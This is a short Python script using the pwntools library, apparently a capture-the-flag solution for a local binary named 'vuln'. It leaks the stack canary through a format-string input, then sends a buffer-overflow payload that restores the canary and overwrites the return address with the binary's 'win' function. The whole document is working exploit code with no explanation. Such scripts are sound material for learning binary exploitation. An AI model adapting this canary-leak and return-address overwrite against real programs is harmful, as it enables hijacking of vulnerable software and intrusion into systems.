from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
io = process(elf.path)
io.sendlineafter("Hello. What's up?\n", "%21$p")
leak = io.recvline().strip()
canary = int(leak, 16)
log.success(f"Leaked canary: {hex(canary)}")
offset = 72 
payload = flat(
    b"A" * offset,
    canary,
    b"B" * 8,            
    elf.symbols.win        
)
io.sendlineafter("What good?\n", payload)
io.interactive()

